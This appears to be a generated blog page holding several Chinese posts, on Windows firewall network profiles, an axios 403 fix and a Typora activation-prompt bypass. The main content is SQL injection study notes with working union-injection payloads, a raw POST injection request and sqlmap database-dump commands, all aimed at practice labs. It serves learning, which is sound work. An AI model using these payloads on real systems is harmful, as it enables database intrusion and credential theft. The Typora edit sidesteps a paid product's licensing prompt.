+<h4 id="设置所属网络属于专用还是公用网络：-5"><a href="#设置所属网络属于专用还是公用网络：-5" class="headerlink" title="设置所属网络属于专用还是公用网络："></a>设置所属网络属于专用还是公用网络：</h4><p>我当前所连接的网络属于专用网络</p>
+<img src="https://img2023.cnblogs.com/blog/2935791/202301/2935791-20230104230135469-1050197392.png" width="40%" >
+
+<h4 id="对当前网络配置文件中专用网络和公用网络的权限进行设置：-5"><a href="#对当前网络配置文件中专用网络和公用网络的权限进行设置：-5" class="headerlink" title="对当前网络配置文件中专用网络和公用网络的权限进行设置："></a>对当前网络配置文件中专用网络和公用网络的权限进行设置：</h4><img src="https://img2023.cnblogs.com/blog/2935791/202301/2935791-20230104225914824-1098693117.png" width="40%" >
+
+<p>以下是关闭专用网络中网络发现后在windows资源管理器中访问网络的结果：</p>
+<img src="https://img2023.cnblogs.com/blog/2935791/202301/2935791-20230104232203890-196388957.png" width="40%" >
+https://www.cnblogs.com/junlin623/p/17026275.html
+
+
+
+
+<hr>
+<p>title: ‘Windows Defender防火墙允许的应用和功能中专用和公用选项是什么意思？-junlin623’<br>date: 2023-01-04 23:04:00</p>
+<hr>
+<meta name = "referrer" content = "no-referrer" />
+
+
+
+<img src="https://img2023.cnblogs.com/blog/2935791/202301/2935791-20230104224838764-1158143991.png" width="60%" >
+
+
+<p>这里的专用和公用是指防火墙是否允许特定应用在专用或者公用网络中进行通信</p>
+<h4 id="什么是专用和公用网络？-6"><a href="#什么是专用和公用网络？-6" class="headerlink" title="什么是专用和公用网络？"></a>什么是专用和公用网络？</h4><p>下面是windows给我们定义的：</p>
+<img src="https://img2023.cnblogs.com/blog/2935791/202301/2935791-20230104225328305-320597347.png" width="30%" >
+
+<p>这个定义并不是绝对的，只是windows给了我们两个选项，我们可以自行设定我们所在的网络是专用还是公用，然后我们可以给专用网络和公用网络特定的权限，进而对某个网络的权限进行了设置，比如家里的网络我们设置成专用网络，权限是启用网络发现； 图书馆等公共场所的网络我们可以设置成公用网络，权限是不启用网络发现，让其他设备无法访问到你并且无法进行文件共享等</p>
+<h4 id="设置所属网络属于专用还是公用网络：-6"><a href="#设置所属网络属于专用还是公用网络：-6" class="headerlink" title="设置所属网络属于专用还是公用网络："></a>设置所属网络属于专用还是公用网络：</h4><p>我当前所连接的网络属于专用网络</p>
+<img src="https://img2023.cnblogs.com/blog/2935791/202301/2935791-20230104230135469-1050197392.png" width="40%" >
+
+<h4 id="对当前网络配置文件中专用网络和公用网络的权限进行设置：-6"><a href="#对当前网络配置文件中专用网络和公用网络的权限进行设置：-6" class="headerlink" title="对当前网络配置文件中专用网络和公用网络的权限进行设置："></a>对当前网络配置文件中专用网络和公用网络的权限进行设置：</h4><img src="https://img2023.cnblogs.com/blog/2935791/202301/2935791-20230104225914824-1098693117.png" width="40%" >
+
+<p>以下是关闭专用网络中网络发现后在windows资源管理器中访问网络的结果：</p>
+<img src="https://img2023.cnblogs.com/blog/2935791/202301/2935791-20230104232203890-196388957.png" width="40%" >
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2023/05/18/Windows%20Defender%E9%98%B2%E7%81%AB%E5%A2%99%E5%85%81%E8%AE%B8%E7%9A%84%E5%BA%94%E7%94%A8%E5%92%8C%E5%8A%9F%E8%83%BD%E4%B8%AD%E4%B8%93%E7%94%A8%E5%92%8C%E5%85%AC%E7%94%A8%E9%80%89%E9%A1%B9%E6%98%AF%E4%BB%80%E4%B9%88%E6%84%8F%E6%80%9D%EF%BC%9F-junlin623/" data-id="clhrwf8j30010ekszglhh9svu" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-Vue向服务端发送axios请求报错解决：AxiosError {message &#39;Request failed with status code 403&#39;, ...}-junlin623" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2023/05/18/Vue%E5%90%91%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%8F%91%E9%80%81axios%E8%AF%B7%E6%B1%82%E6%8A%A5%E9%94%99%E8%A7%A3%E5%86%B3%EF%BC%9AAxiosError%C2%A0%7Bmessage%20'Request%20failed%20with%20status%20code%20403',%20...%7D-junlin623/" class="article-date">
+  <time class="dt-published" datetime="2023-05-17T16:09:35.147Z" itemprop="datePublished">2023-05-18</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/junlin623/p/17347056.html">https://www.cnblogs.com/junlin623/p/17347056.html</a></p>
+<hr>
+<p>title: ‘Vue向服务端发送axios请求报错解决：AxiosError {message: ‘Request failed with status code 403’, …}-junlin623’<br>date: 2023-04-23 16:53:00</p>
+<hr>
+<meta name = "referrer" content = "no-referrer" />
+
+
+
+<h2 id="Vue向服务端发送axios请求报错解决：AxiosError-message-‘Request-failed-with-status-code-403’-…"><a href="#Vue向服务端发送axios请求报错解决：AxiosError-message-‘Request-failed-with-status-code-403’-…" class="headerlink" title="Vue向服务端发送axios请求报错解决：AxiosError {message: ‘Request failed with status code 403’, …}"></a>Vue向服务端发送axios请求报错解决：AxiosError {message: ‘Request failed with status code 403’, …}</h2><hr>
+<p>登录界面点击提交向服务端发送用户名和密码，在Vue中用axios向服务端发送请求，一直显示403错误：</p>
+<img src="https://img2023.cnblogs.com/blog/2935791/202304/2935791-20230423164214199-2006558905.png" width="50%" >
+
+<p>出现问题的前端请求代码如下：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">axios</span>(&#123;</span><br><span class="line">    <span class="attr">method</span>: <span class="string">&quot;POST&quot;</span>,</span><br><span class="line">    <span class="attr">url</span>: <span class="string">&quot;http://127.0.0.1/user/account/token&quot;</span>, </span><br><span class="line">    <span class="attr">data</span>: &#123;</span><br><span class="line">        <span class="attr">username</span>: data.<span class="property">username</span>,</span><br><span class="line">        <span class="attr">password</span>: data.<span class="property">password</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">&#125;).<span class="title function_">then</span>(<span class="function"><span class="params">response</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(response);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+
+<p>springboot后端接收参数的代码如下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@PostMapping(&quot;/account/token&quot;)</span></span><br><span class="line"><span class="keyword">public</span> Map&lt;String, String&gt; <span class="title function_">getToken</span><span class="params">(String username, String password)</span> &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;username: &quot;</span> + username);</span><br><span class="line">    System.out.println(<span class="string">&quot;password: &quot;</span> + password);</span><br><span class="line">    <span class="keyword">return</span> userService.getToken(username, password);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>后端意在接收前端的表单类型数据</strong></p>
+<p>查阅资料发现：axios会将我们请求和响应的数据自动转换成JSON格式 （原生ajax就没有，所以原生ajax在这里可以直接成功）</p>
+<img src="https://img2023.cnblogs.com/blog/2935791/202304/2935791-20230423164636336-1095913918.png" width="50%" >
+
+<p>springmvc中如果要接收json格式的数据需要添加 <code>@RequestBody</code> 注解，所以可以去修改后端，但这里毕竟还是要接收表单类型数据 <code>x-www-form-urlencoded</code>,因此我们应该指定axios请求头的<code>Content-Type</code> 为<code>x-www-form-urlencoded</code></p>
+<p>修改的axios请求代码如下：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">axios</span>(&#123;</span><br><span class="line">    <span class="attr">method</span>: <span class="string">&quot;POST&quot;</span>,</span><br><span class="line">    <span class="attr">url</span>: <span class="string">&quot;http://127.0.0.1/user/account/token&quot;</span>, </span><br><span class="line">    <span class="attr">data</span>: &#123;</span><br><span class="line">        <span class="attr">username</span>: data.<span class="property">username</span>,</span><br><span class="line">        <span class="attr">password</span>: data.<span class="property">password</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">headers</span>: &#123;</span><br><span class="line">        <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">&#125;).<span class="title function_">then</span>(<span class="function"><span class="params">response</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(response);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+
+<p>后端保持原有的接收参数的方式,</p>
+<p>但是浏览器中的 <code>Content-Type</code> 还是json类型(不知道为啥)，但是请求毕竟成功了~~</p>
+<img src="https://img2023.cnblogs.com/blog/2935791/202304/2935791-20230423165200487-928805368.png" widht="50%" >
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2023/05/18/Vue%E5%90%91%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%8F%91%E9%80%81axios%E8%AF%B7%E6%B1%82%E6%8A%A5%E9%94%99%E8%A7%A3%E5%86%B3%EF%BC%9AAxiosError%C2%A0%7Bmessage%20'Request%20failed%20with%20status%20code%20403',%20...%7D-junlin623/" data-id="clhrwf8j30011eksz77w7hxlz" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-Typora无需破解就能去掉弹出的激活框-junlin623" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2023/05/18/Typora%E6%97%A0%E9%9C%80%E7%A0%B4%E8%A7%A3%E5%B0%B1%E8%83%BD%E5%8E%BB%E6%8E%89%E5%BC%B9%E5%87%BA%E7%9A%84%E6%BF%80%E6%B4%BB%E6%A1%86-junlin623/" class="article-date">
+  <time class="dt-published" datetime="2023-05-17T16:09:35.145Z" itemprop="datePublished">2023-05-18</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/junlin623/p/17220440.html">https://www.cnblogs.com/junlin623/p/17220440.html</a></p>
+<hr>
+<p>title: ‘Typora无需破解就能去掉弹出的激活框-junlin623’<br>date: 2023-03-15 22:23:00</p>
+<hr>
+<meta name = "referrer" content = "no-referrer" />
+
+
+
+<p>每次打开的时候都会弹出这个窗口，作为日常笔记工具来说还是没必要去充钱</p>
+<img src="https://img2023.cnblogs.com/blog/2935791/202303/2935791-20230315221140408-1871500875.png" width="50%" >
+
+<hr>
+<p>由于Typora是用electron开发的，所以这个激活弹出框应该可以由js代码控制，</p>
+<p>每个人的安装路径不同，但是后面都是一样的，我的路径是： <code>D:\Typora\Typora\resources\page-dist</code></p>
+<p>可以看到一个license.html文件，</p>
+<img src="https://img2023.cnblogs.com/blog/2935791/202303/2935791-20230315222121322-430717479.png" width="50%" >
+
+
+<p>在浏览器中打开，是熟悉的页面无疑了~~</p>
+<img src="https://img2023.cnblogs.com/blog/2935791/202303/2935791-20230315221721875-1912160421.png" width="50%" >
+
+
+<p>用vscode打开，使用快捷键格式化代码 <code>Shift + Alt + A</code></p>
+<p>在文件下方添加如下代码可以强制关闭弹出窗口：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="variable language_">window</span>.<span class="title function_">close</span>()</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<img src="https://img2023.cnblogs.com/blog/2935791/202303/2935791-20230315221839504-1511833437.png" width="50%" >
+
+
+<p>重新打开Typora发现就不会弹出激活框了</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2023/05/18/Typora%E6%97%A0%E9%9C%80%E7%A0%B4%E8%A7%A3%E5%B0%B1%E8%83%BD%E5%8E%BB%E6%8E%89%E5%BC%B9%E5%87%BA%E7%9A%84%E6%BF%80%E6%B4%BB%E6%A1%86-junlin623/" data-id="clhrwf8j2000yekszapmddr9z" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-sql注入笔记整理-junlin623" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2023/05/18/sql%E6%B3%A8%E5%85%A5%E7%AC%94%E8%AE%B0%E6%95%B4%E7%90%86-junlin623/" class="article-date">
+  <time class="dt-published" datetime="2023-05-17T16:09:35.142Z" itemprop="datePublished">2023-05-18</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/junlin623/p/17212425.html">https://www.cnblogs.com/junlin623/p/17212425.html</a></p>
+<hr>
+<p>title: ‘sql注入笔记整理-junlin623’<br>date: 2023-03-13 18:16:00</p>
+<hr>
+<meta name = "referrer" content = "no-referrer" />
+
+
+
+<h3 id="注入的原理"><a href="#注入的原理" class="headerlink" title="注入的原理"></a>注入的原理</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SQL注入即是指**web应用程序**对**用户输入数据(web表单)**的合法性没有判断或过滤不严，攻击者可以在web应用程序中事先定义好的**查询语句的结尾上添加额外的SQL语句**，在管理员不知情的情况下实现非法操作，以此来实现欺骗数据库服务器**执行非授权的任意查询**，从而进一步得到相应的数据信息。</span><br></pre></td></tr></table></figure>
+
+<h3 id="观察源码，判断数据是如何传输的"><a href="#观察源码，判断数据是如何传输的" class="headerlink" title="观察源码，判断数据是如何传输的"></a>观察源码，判断数据是如何传输的</h3><h3 id="本地搭建"><a href="#本地搭建" class="headerlink" title="本地搭建"></a>本地搭建</h3><p>  <img src="https://secure2.wostatic.cn/static/sHKpaAv4dJirXJGQKUDd6J/image.png?auth_key=1678978523-prQdWncyGgd6gu6b1pMjhv-0-eac376566bd590bb98444981e5148162"></p>
+<h3 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h3><p>  <img src="https://secure2.wostatic.cn/static/2xmaqFAEDeG8PcpGrQ5mKk/image.png?auth_key=1678978523-kBtAteVuvPfnpHy6LN5zXv-0-872adc0ba59de8a83e06a3f75f1d68b8"></p>
+<p>  <img src="https://secure2.wostatic.cn/static/6txHFEDWAXUmZkRyvv1cnK/image.png?auth_key=1678978523-gCbcQxFjyeU1mwzAvu2Ed7-0-7c263fe02a0895f58ef9e82bda1281a3"></p>
+<p>  <img src="https://secure2.wostatic.cn/static/6ZqyJtJgEaybW9uTii2sRD/image.png?auth_key=1678978523-rTutNqZ265oA64hGJ7SPk2-0-e42ce7eff19a5bf427d60f2b02402344"></p>
+<h3 id="恶意语句的构造-union注入"><a href="#恶意语句的构造-union注入" class="headerlink" title="恶意语句的构造 union注入"></a>恶意语句的构造 union注入</h3><h4 id="1-求闭合"><a href="#1-求闭合" class="headerlink" title="1.求闭合"></a>1.求闭合</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">0x1 整形的闭合</span><br><span class="line">SELECT * FROM <span class="built_in">users</span> WHERE <span class="built_in">id</span>=<span class="variable">$id</span> LIMIT 0,1</span><br><span class="line"></span><br><span class="line">Less-1/?<span class="built_in">id</span>=3                 <span class="comment">#用户输入  3</span></span><br><span class="line">Less-1/?<span class="built_in">id</span>=3 -- -            <span class="comment">#用户输入  3-- -</span></span><br><span class="line">Less-1/?<span class="built_in">id</span>=3 and 1=1-- -     <span class="comment">#用户输入  and 1=1-- -  </span></span><br><span class="line">Less-1/?<span class="built_in">id</span>=3 and 1=2-- -     <span class="comment">#用户输入  and 1=2-- - </span></span><br><span class="line">-------------------------------------</span><br><span class="line">0x2 字符的闭合</span><br><span class="line">SELECT * FROM <span class="built_in">users</span> WHERE <span class="built_in">id</span>=<span class="string">&#x27;$id&#x27;</span> LIMIT 0,1</span><br><span class="line">SELECT * FROM <span class="built_in">users</span> WHERE <span class="built_in">id</span>=<span class="string">&quot;<span class="variable">$id</span>&quot;</span> LIMIT 0,1</span><br><span class="line">SELECT * FROM <span class="built_in">users</span> WHERE <span class="built_in">id</span>=(<span class="string">&#x27;$id&#x27;</span>) LIMIT 0,1</span><br><span class="line"></span><br><span class="line">Less-1/?<span class="built_in">id</span>=3<span class="string">&#x27;                 #用户输入  3&#x27;</span></span><br><span class="line">Less-1/?<span class="built_in">id</span>=3<span class="string">&#x27; -- -            #用户输入  3&#x27;</span>-- -</span><br><span class="line">Less-1/?<span class="built_in">id</span>=3<span class="string">&#x27; and 1=1-- -     #用户输入  **3&#x27;</span> and 1=1-- - **</span><br><span class="line">Less-1/?<span class="built_in">id</span>=3<span class="string">&#x27; and 1=2-- -     #用户输入  3&#x27;</span> and 1=2-- -</span><br><span class="line">--------------------------------------</span><br></pre></td></tr></table></figure>
+
+<h4 id="2-求列数"><a href="#2-求列数" class="headerlink" title="2.求列数"></a>2.求列数</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Less<span class="number">-3</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;) and 1=1 order by 1-- -   #页面正常</span></span><br><span class="line"><span class="string">Less-3/?id=1&#x27;</span>) <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">1</span>,<span class="number">2</span><span class="comment">-- - #页面正常</span></span><br><span class="line">Less<span class="number">-3</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;) and 1=1 order by 1,2,3-- - #页面正常</span></span><br><span class="line"><span class="string">Less-3/?id=1&#x27;</span>) <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span><span class="comment">-- - #页面错误</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h4 id="3-求显示位"><a href="#3-求显示位" class="headerlink" title="3.求显示位"></a>3.求显示位</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Less-1/?<span class="built_in">id</span>=1<span class="string">&#x27; and 1=2 union select 1,2,3-- -  #把and 1=1 改成 1=2，把order by 改为 union select</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Less-1/?id=-1&#x27;</span> and 1=1 union <span class="keyword">select</span> 1,2,3-- -   <span class="comment">#或者把id=1 改成id=-1，把order by 改为 union select</span></span><br><span class="line"></span><br><span class="line">mysql&gt; <span class="keyword">select</span> <span class="built_in">id</span>,username from <span class="built_in">users</span> union <span class="keyword">select</span> * from emails;</span><br><span class="line">注意：union 语句只在<span class="keyword">select</span>的用法中使用，可以同时执行两条语句；需要注意的是，第一个查询和后面一个查询语句的查询列数一定要相同</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h4 id="4-求数据库"><a href="#4-求数据库" class="headerlink" title="4.求数据库"></a>4.求数据库</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">/</span>Less<span class="number">-1</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and 1=2 union select 1,version(),database()-- -</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>
+
+<h4 id="5-求表"><a href="#5-求表" class="headerlink" title="5.求表"></a>5.求表</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/Less-2/?<span class="built_in">id</span>=-1 and 1=1 union <span class="keyword">select</span>  1,version(),group_concat(table_name) from information_schema.tables <span class="built_in">where</span> table_schema=database()-- -</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h4 id="6-求列"><a href="#6-求列" class="headerlink" title="6.求列"></a>6.求列</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Less-2/?<span class="built_in">id</span>=-1 and 1=1 union <span class="keyword">select</span>  1,version(),group_concat(column_name) from information_schema.columns <span class="built_in">where</span> table_schema=database()-- -</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">/Less-2/?<span class="built_in">id</span>=-1 and 1=1 union <span class="keyword">select</span>  1,version(),group_concat(column_name) from information_schema.columns <span class="built_in">where</span> table_schema=database() and table_name=<span class="string">&#x27;users&#x27;</span>-- -</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h4 id="7-求字段"><a href="#7-求字段" class="headerlink" title="7.求字段"></a>7.求字段</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/Less-2/?<span class="built_in">id</span>=-1 and 1=1 union <span class="keyword">select</span> 1,version(),group_concat(<span class="built_in">id</span>,username,password) from <span class="built_in">users</span>-- -</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="http://ks.caichuanqi.cn:7991/trouble/145">http://ks.caichuanqi.cn:7991/trouble/145</a></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.iwebsec.com:81/sqli/02.php?<span class="built_in">id</span>=1<span class="string">&#x27; and 1=1 union select 1,2,database()-- -</span></span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="http://ks.caichuanqi.cn:7991/trouble/160">http://ks.caichuanqi.cn:7991/trouble/160</a></p>
+<h3 id="POST注入"><a href="#POST注入" class="headerlink" title="POST注入"></a>POST注入</h3><h4 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h4><p>  <img src="https://secure2.wostatic.cn/static/2NRi3Yuv5cmcGKZs1RuEDY/image.png?auth_key=1678978523-rkYjmrFEwdVcmoHFNnh6xB-0-e4ed7af34803999effcc03838f120d92"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST /vul/sqli/sqli_id.php HTTP/1.1</span><br><span class="line">Host: 5ef1fba9-3ba9-42d4-8616-02d54c3a96ed.node4.buuoj.cn:81</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 118</span><br><span class="line">Origin: http://5ef1fba9-3ba9-42d4-8616-02d54c3a96ed.node4.buuoj.cn:81</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://5ef1fba9-3ba9-42d4-8616-02d54c3a96ed.node4.buuoj.cn:81/vul/sqli/sqli_id.php</span><br><span class="line">Cookie: PHPSESSID=crr6bpf1lo1iptpcv8o6mv2c6h</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line"><span class="built_in">id</span>=3 and 1=1 union <span class="keyword">select</span> 1,group_concat(<span class="built_in">id</span>,0x23,username,0x23,password) from <span class="built_in">users</span>-- -&amp;submit=%E6%9F%A5%E8%AF%A2</span><br></pre></td></tr></table></figure>
+
+<h4 id="方法二（不稳定）"><a href="#方法二（不稳定）" class="headerlink" title="方法二（不稳定）"></a>方法二（不稳定）</h4><p>  <img src="https://secure2.wostatic.cn/static/dnSPNh9zEAoRNsZ6vffwZp/image.png?auth_key=1678978523-bqTTTKCdpAHMzg3J3F1LX3-0-90e0582193df645fb48ec1c6997998e5"></p>
+<h3 id="sqlmap脚本sql注入"><a href="#sqlmap脚本sql注入" class="headerlink" title="sqlmap脚本sql注入"></a>sqlmap脚本sql注入</h3><h4 id="工具和环境"><a href="#工具和环境" class="headerlink" title="工具和环境"></a>工具和环境</h4><p>  工具：sqlmap脚本</p>
+<p>  环境：python3的环境</p>
+<p>  <a target="_blank" rel="noopener" href="https://www.wolai.com/caichuanqi/vTCbqb4rvQbyPcL8CEeyr2#5fp2PM9iVjVc2SLAf9sbse">https://www.wolai.com/caichuanqi/vTCbqb4rvQbyPcL8CEeyr2#5fp2PM9iVjVc2SLAf9sbse</a></p>
+<h4 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h4><p>  <img src="https://secure2.wostatic.cn/static/gdVg3tuXq8o8wbr8RgGxx6/image.png?auth_key=1678978523-3m9PsdkAnULhJTnUwE4YXu-0-8841311fc5321202f889dc98227ab866"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">dir</span>                          <span class="comment">#查看当前目录下的文件目录</span></span><br><span class="line">python sqlmap.py             <span class="comment">#判断sqlmap.py脚本是否可以正常运行</span></span><br><span class="line">python sqlmap.py -h          <span class="comment">#查看sqlmap.py脚本的帮助手册</span></span><br><span class="line">python sqlmap.py -<span class="built_in">help</span>       <span class="comment">#查看sqlmap.py脚本的详细帮助手册</span></span><br><span class="line">------------------------------------------------------------------</span><br><span class="line">http://www.iwebsec.com:81/sqli/02.php?<span class="built_in">id</span>=1</span><br><span class="line">python sqlmap.py -u <span class="string">&quot;http://www.iwebsec.com:81/sqli/02.php?id=1&quot;</span> </span><br><span class="line"><span class="comment">#其中“-u”参数用于指定注入点的URL。</span></span><br><span class="line"></span><br><span class="line">python sqlmap.py -u <span class="string">&quot;http://www.iwebsec.com:81/sqli/02.php?id=1&quot;</span> --dbs</span><br><span class="line"><span class="comment">#，其中参数“--dbs”用于列举数据库。</span></span><br><span class="line"></span><br><span class="line">python sqlmap.py -u <span class="string">&quot;http://www.iwebsec.com:81/sqli/02.php?id=1&quot;</span> -D iwebsec --tables</span><br><span class="line"><span class="comment">#其中参数“-D”用于指定数据库名称，“--tables”参数用于列举表。</span></span><br><span class="line"></span><br><span class="line">python sqlmap.py -u <span class="string">&quot;http://www.iwebsec.com:81/sqli/02.php?id=1&quot;</span> -D iwebsec -T user --columns</span><br><span class="line"><span class="comment">#其中参数“-T”用于指定表名称，“--columns”参数用于指定列出表中字段。</span></span><br><span class="line"></span><br><span class="line">python sqlmap.py -u <span class="string">&quot;http://www.iwebsec.com:81/sqli/02.php?id=1&quot;</span> -D iwebsec -T user -C <span class="built_in">id</span>,password,username --dump</span><br><span class="line"><span 